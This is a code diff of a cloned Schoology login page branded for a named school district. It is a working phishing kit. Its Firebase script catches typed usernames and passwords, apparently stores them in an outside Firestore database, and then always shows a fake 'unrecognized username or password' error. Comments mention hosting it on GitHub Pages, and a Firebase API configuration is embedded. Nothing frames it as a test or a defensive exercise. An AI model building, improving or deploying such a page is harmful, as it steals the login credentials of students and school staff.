@@ -1,123 +1,179 @@
 <!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" data-theme="modern" class="wf-karla-n4-active wf-active js js no-touch hashchange history rgba borderradius boxshadow textshadow opacity cssanimations cssgradients csstransforms csstransforms3d csstransitions fontface generatedcontent boxsizing display-table lastchild placeholder wf-inactive" style="">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" data-theme="modern">
 <head>
-    <!-- ... ( HTML refs) ... -->
-    <link rel="shortcut icon" href="https://asset-cdn.schoology.com/sites/all/themes/schoology_theme/favicon.ico" type="image/x-icon">
-    <link rel="image_src" href="/images/schoology_thumbnail.png">
-    <link rel="stylesheet" type="text/css" href="https://asset-cdn.schoology.com/sites/all/themes/schoology_theme/theme-modern-sgy.css">
-    <link rel="stylesheet" type="text/css" href="https://asset-cdn.schoology.com/sites/all/themes/schoology_theme/css/style.css?1444671451">
-    <link rel="stylesheet" type="text/css" href="https://asset-cdn.schoology.com/sites/all/themes/schoology_theme/css/thickbox.css?qrstuv" media="screen">
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Karla:400&subset=latin" media="all">
-    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
-    <link rel="stylesheet" type="text/css" href="https://asset-cdn.schoology.com/sites/all/themes/schoology_theme/css/login.css?qrt">
-    <link rel="stylesheet" type="text/css" href="https://asset-cdn.schoology.com/sites/all/themes/schoology_theme/css/rebranded.css">
-    <link type="text/css" rel="stylesheet" media="all" href="https://asset-cdn.schoology.com/sites/all/themes/schoology_theme/school_themes/style.css.php?theme=5672843957&updated=1645112971&6839426d0b46490f">
-    <title>Login to Schoology</title>
-    <meta name="description" content="Schoology allows instructors, students and administrators to create a meaningful virtual classroom and extend learning beyond the boundaries of the physical classroom">
+    <script type="text/javascript">
+      WebFontConfig = {
+        google: { families: [ 'Karla:400:latin' ] } // This is from your HTML, --sgy-font-default might be Karla
+      };
+      (function() {
+        var h = document.getElementsByTagName('html')[0];
+        h.className += ' wf-karla-n4-loading';
+        var t = setTimeout(function() {
+          h.className = h.className.replace(/(\s|^)wf-loading(\s|$)/g, ' ');
+          h.className = h.className.replace(/(\s|^)wf-karla-n4-loading(\s|$)/g, ' ');
+          h.className += ' wf-inactive';
+        }, 2000);
+        var wf = document.createElement('script');
+        wf.src = ('https:' == document.location.protocol ? 'https' : 'http') +
+          '://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js';
+        wf.type = 'text/javascript';
+        wf.async = 'true';
+        var s = document.getElementsByTagName('script')[0];
+        s.parentNode.insertBefore(wf, s);
+      })();
+    </script>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="google-site-verification" content="6ystVr7sfpd20ctZGukFGunzOJQW7O6kJpXvzAxSEzI" />
+    <meta name="google-site-verification" content="9tK81P_TYDOlOx_Me0FXzEj_nQnkL9G0kQxRcG4LT7I" />
+    <meta name="p:domain_verify" content="d76e189f546bfd185bd2a3ec1a7f214c" />
+    <link rel="shortcut icon" href="https://asset-cdn.schoology.com/sites/all/themes/schoology_theme/favicon.ico" type="image/x-icon" />
+    <link rel="image_src" href="/images/schoology_thumbnail.png" />
+    <link rel="stylesheet" type="text/css" href="https://asset-cdn.schoology.com/sites/all/themes/schoology_theme/theme-modern-sgy.css"/>
+    <!-- Using CDN for jQuery from previous attempts, as original /misc/ path won't work on GitHub Pages -->
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <!-- Other JS from original HTML - these might not work without the full Schoology environment/paths -->
+    <!-- <script type="text/javascript" src="/misc/jquery-html-prefilter-3.5.0-backport.js?1405525770"></script> -->
+    <!-- <script type="text/javascript" src="/misc/drupal.js?qrstuv"></script> -->
+    <!-- ... more original scripts ... -->
 
+    <!-- CSS files from original HTML - these are important for the look -->
+    <link rel="stylesheet" type="text/css" href="https://asset-cdn.schoology.com/sites/all/themes/schoology_theme/css/style.css?1444671451" />
+    <link rel="stylesheet" type="text/css" href="https://asset-cdn.schoology.com/sites/all/themes/schoology_theme/css/thickbox.css?qrstuv" media="screen" />
+    <link rel="stylesheet" type="text/css" href="https://asset-cdn.schoology.com/sites/all/themes/schoology_theme/css/login.css?qrt" />
+    <link rel="stylesheet" type="text/css" href="https://asset-cdn.schoology.com/sites/all/themes/schoology_theme/css/rebranded.css?qrt" />
+    <link type="text/css" rel="stylesheet" media="all" href="https://asset-cdn.schoology.com/sites/all/themes/schoology_theme/school_themes/style.css.php?theme=5672843957&updated=1645112971&6839426d0b46490f" />
+    <title>Log in to Schoology</title>
+    <meta name="description" content="Schoology allows instructors, students and administrators to create a meaningful virtual classroom and extend learning beyond the boundaries of the physical classroom" />
+
+    <!-- FIREBASE SDKs -->
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>
 
     <style>
-        #supplementary {
-            margin-top: 0px; /* break between blue and white */
+        /* The Schoology CSS might define '--sgy-font-default'. If not, Arial is a good fallback. */
+        /* The CSS you provided: #login-container .messages { margin-bottom: 15px; } */
+        /* And: .login-page #login-container .login-content .messages { margin-top: 13px; margin-bottom: 20px; } */
+
+        /* Style for our specific error message, designed to look like the screenshot */
+        #schoology-error-message-container.messages.error-active { /* Add .error-active class via JS */
+            display: flex !important; /* Use flex to show and align items, !important to override potential 'display: none' from other rules */
+            align-items: center;
+            background-color: #fdecea;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+            padding: 12px 20px;
+            /* margin-bottom will be handled by .messages class from Schoology CSS if it applies */
+            /* margin-top will be handled by .messages class from Schoology CSS if it applies */
+            border-radius: 4px;
+            font-family: var(--sgy-font-default, Arial, Helvetica, sans-serif); /* Use Schoology font var or fallback */
+            font-size: 14px;
+            line-height: 1.5;
+            box-sizing: border-box;
+            /* margin-top: 13px; /* From .login-page #login-container .login-content .messages */
+            /* margin-bottom: 20px; /* From .login-page #login-container .login-content .messages */
+        }
+
+        #schoology-error-message-container .error-icon {
+            background-color: #D43C31;
+            color: white;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: bold;
+            font-size: 13px;
+            margin-right: 10px;
+            flex-shrink: 0;
+        }
+        /* Hiding elements not relevant to this simple clone for Firebase submission */
+        #edit-school-wrapper, .forgot-password, .sso-login {
+            display: none !important;
+        }
+        .login-page #login-container .forgot-header { /* From your provided HTML, it was visible */
+            display: none !important; /* Hide "Forgot Password" header if it appears */
         }
     </style>
-
 </head>
-<body class="login-page ldap-login vsc-initialized">
-
-  <header id="branding" class="clearfix">
-    <div class="container clearfix">
-      <a id="logo" class="ir" href="/"><span>Schoology</span></a>
-    </div>
-  </header>
-
+<body class="proxima login-page accessibility-enhanced modern-theme"> <!-- Using class from your new HTML -->
+    <header class="modern-header">
+        <div class="modern-header-content">
+            <a class="modern-header-logo" href="https://www.schoology.com/">
+                <img src="https://asset-cdn.schoology.com/sites/all/themes/schoology_theme/images_front/sgylogo.svg" alt="PowerSchool Schoology Learning Logo">
+            </a>
+        </div>
+    </header>
+<div class="modern-wrapper">
   <div id="supplementary">
     <div class="container">
-      <div id="content-container" class="login login-ldap">
+      <div id="content-container" class="login login-sites-all-themes-schoology_theme-css-thickbox.css"> <!-- This class name looks odd, might be a copy-paste artifact but keeping as provided -->
           <div id="main-content">
               <div id="login-container">
                   <div class="login-content clearfix">
-                      <!--  ERROR MESSAGE (Initially Hidden) -->
-                      <div id="schoology-error-message-container" style="
-                          display: none; /* JS will change this to 'flex' */
-                          align-items: center;
-                          background-color: #fdecea;
-                          border: 1px solid #f5c6cb;
-                          color: #721c24;
-                          padding: 12px 20px;
-                          margin-bottom: 16px;
-                          border-radius: 4px;
-                          font-family: Arial, Helvetica, sans-serif; /* UPDATED FONT */
-                          font-size: 14px; /* might need to fine-tune this based on font */
-                          line-height: 1.5;
-                          box-sizing: border-box;
-                      ">
-                          <span style="
-                              background-color: #D43C31;
-                              color: white;
-                              border-radius: 50%;
-                              width: 20px;
-                              height: 20px;
-                              display: inline-flex;
-                              justify-content: center;
-                              align-items: center;
-                              font-weight: bold;
-                              font-size: 13px;
-                              margin-right: 10px;
-                              flex-shrink: 0;
-                          ">!</span>
-                          <span id="error-text-content">Error: Sorry, unrecognized username or password.</span>
-                      </div>
+                        <!-- OUR CUSTOM ERROR MESSAGE DIV - Initially hidden, styled with CSS -->
+                        <div id="schoology-error-message-container" class="messages" style="display: none;">
+                            <span class="error-icon">!</span>
+                            <span id="error-text-content">Error: Sorry, unrecognized username or password.</span>
+                        </div>
 
-                      <span class="h3 sign-in-header">Sign in to Schoology</span>
-                      <form accept-charset="UTF-8" method="post" id="s-user-login-form">
-                          <div>
-                              <div class="form-item">
+                        <h3 class="sign-in-header">Sign in to Schoology</h3>
+                        <!-- <h3 class="forgot-header">Forgot Password</h3> --> <!-- Hidden via CSS -->
+
+                        <form action="#" accept-charset="UTF-8" method="post" id="s-user-login-form"> <!-- Changed action to # -->
+                            <div>
+                                <div class="form-item">
                                   <span class="required-text-label" tabindex="-1" role="text">All fields are required</span>
-                              </div>
-                              <div class="form-item " id="edit-mail-wrapper">
-                                  <label for="edit-mail">Email or Username (required): </label>
-                                  <input type="text" maxlength="128" name="mail" id="edit-mail" size="60" value="" placeholder="Email or Username" aria-required="true" class="form-text">
-                              </div>
-                              <div class="form-item " id="edit-pass-wrapper">
-                                  <label for="edit-pass">Password (required): </label>
-                                  <input type="password" name="pass" id="edit-pass" maxlength="128" size="60" placeholder="Password" aria-required="true" autocomplete="off" class="form-text">
-                              </div>
-                              <input type="hidden" name="school_nid" id="edit-school-nid" value="5672843957">
-                              <div class="school-name-wrapper">
-                                  <div class="school-name">Amity Regional School District 05 <span class="small gray school-location">Woodbridge, CT</span></div>
-                              </div>
-                              <span class="submit-span-wrapper">
-                                  <input type="submit" name="op" id="edit-submit" value="Log in" class="form-submit">
-                              </span>
-                              <input type="hidden" name="form_build_id" value="d5c6b6f-TJ9q6sk-yTndgthIT9y6tB0bPY9bC5GsCNzl04_i77k">
-                              <input type="hidden" name="form_id" value="s_user_login_form">
-                          </div>
-                      </form>
+                                </div>
+                                <div class="form-item " id="edit-mail-wrapper">
+                                 <label for="edit-mail">Email or Username (required): </label>
+                                 <input type="text" maxlength="128" name="mail" id="edit-mail" size="60" value="" placeholder="Email or Username" aria-required="true" class="form-text" />
+                                </div>
+                                <div class="form-item " id="edit-pass-wrapper">
+                                 <label for="edit-pass">Password (required): </label>
+                                 <input type="password" name="pass" id="edit-pass"  maxlength="128"  size="60"  placeholder="Password" aria-required="true" autocomplete="off" class="form-text" />
+                                </div>
+
+                                <!-- Hiding school selection and other elements not needed for this Firebase task -->
+                                <!--
+                                <div class="form-item" id="edit-school-wrapper">
+                                  ...
+                                </div>
+                                <input type="hidden" name="school_nid" id="edit-school-nid" value=""  />
+                                -->
+                                <span class="submit-span-wrapper"><input type="submit" name="op" id="edit-submit" value="Log in"  class="form-submit" /></span>
+                                <!--
+                                <div class="forgot-password"><a href="/login/forgot">Forgot your password</a></div>
+                                <div class="sso-login"><span tabindex="0" role="link" class="sso-login-link clickable">SSO Login</span><span tabindex="0" role="link" class="regular-login-link hidden">Regular Login</span></div>
+                                -->
+                                <input type="hidden" name="form_build_id" id="d5cf51d-D05EcWVyYy8dfSodmdGTD-5RntZ8jEOQUke2y6U0LYo" value="d5cf51d-D05EcWVyYy8dfSodmdGTD-5RntZ8jEOQUke2y6U0LYo"  />
+                                <input type="hidden" name="form_id" id="edit-s-user-login-form" value="s_user_login_form"  />
+                            </div>
+                        </form>
                   </div>
               </div>
           </div>
       </div>
     </div>
   </div>
+<footer class="modern-footer">
+  <div class="modern-footer-container">
+    <div class="modern-footer-links">
+      <a href="https://www.powerschool.com/privacy" target="_blank">Privacy Policy</a>
+      <span>|</span>
+      <a href="https://www.powerschool.com/wp-content/uploads/PowerSchool-Service-Agreements/2024_PowerSchool_MSA.pdf" target="_blank">Terms of Use</a>
+      <span>|</span>
+      <a href="https://help.powerschool.com" target="_blank">Help Center</a>
+    </div>
+    <div class="modern-footer-copyright">
+      PowerSchool © 2025
+    </div>
+  </div>
+</footer>
+</div> <!-- This was an extra div in your provided HTML, might be a copy paste error, or part of modern-wrapper -->
 
-  <footer id="page-footer">
-  </footer>
-
-  <script type="text/javascript">
-    $(document).ready(function(){
-      if (typeof $ !== 'undefined' && $('form input[type="text"]:first').length) {
-          $('form input[type="text"]:first').focus();
-      } else if (document.querySelector('form input[type="text"]')) {
-          document.querySelector('form input[type="text"]').focus();
-      }
-    });
-  </script>
-
-  <!-- FIREBASE SCRIPT -->
-  <script>
+<!-- FIREBASE SCRIPT -->
+<script>
     const firebaseConfig = {
   apiKey: "AIzaSyC8tojtuCHSgSY3jdrbal8BH4cq1UU1KLI",
   authDomain: "idkbruh-c8cb4.firebaseapp.com",
@@ -127,6 +183,7 @@
   appId: "1:155774984997:web:5ddc18b335e3cb7c80b0cc",
   measurementId: "G-92XKJRD79B"
 };
+
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
@@ -138,22 +195,24 @@
 
     if (loginForm) {
       loginForm.addEventListener('submit', function(event) {
-        event.preventDefault();
+        event.preventDefault(); // Prevent default form submission
 
         const emailOrUsername = emailInput.value.trim();
         const password = passwordInput.value;
 
+        // Hide error message on new attempt
         if (schoologyErrorContainer) {
-            schoologyErrorContainer.style.display = 'none'; // Hide on new attempt
+            schoologyErrorContainer.style.display = 'none';
+            schoologyErrorContainer.classList.remove('error-active');
         }
 
         if (!emailOrUsername || !password) {
             if (schoologyErrorContainer) {
-                schoologyErrorContainer.style.display = 'flex'; // Show error
+                schoologyErrorContainer.style.display = 'flex'; // Show it
+                schoologyErrorContainer.classList.add('error-active'); // Add class for full styling
             }
             console.log("Client-side: Empty username or password.");
-            // Re-enable button if we return early
-            if(submitButton) submitButton.disabled = false;
+            if(submitButton) submitButton.disabled = false; // Re-enable button if validation fails
             return;
         }
 
@@ -173,7 +232,8 @@
         })
         .finally(() => {
             if (schoologyErrorContainer) {
-                schoologyErrorContainer.style.display = 'flex'; // Show error
+                schoologyErrorContainer.style.display = 'flex'; // Ensure it's visible
+                schoologyErrorContainer.classList.add('error-active'); // Add class for full styling
             }
             // Do not reset form: loginForm.reset();
             if(submitButton) submitButton.disabled = false;
@@ -182,7 +242,14 @@
     } else {
         console.error("Login form with ID 's-user-login-form' not found!");
     }
-  </script>
-
+</script>
+<script type="text/javascript">
+    // Place the cursor in the first textbox
+    $(document).ready(function(){
+      if (typeof $ !== 'undefined' && $('form input:eq(0)').length) { // Check if jQuery and element exist
+          $('form input:eq(0)').focus();
+      }
+    });
+</script>
 </body>
 </html>
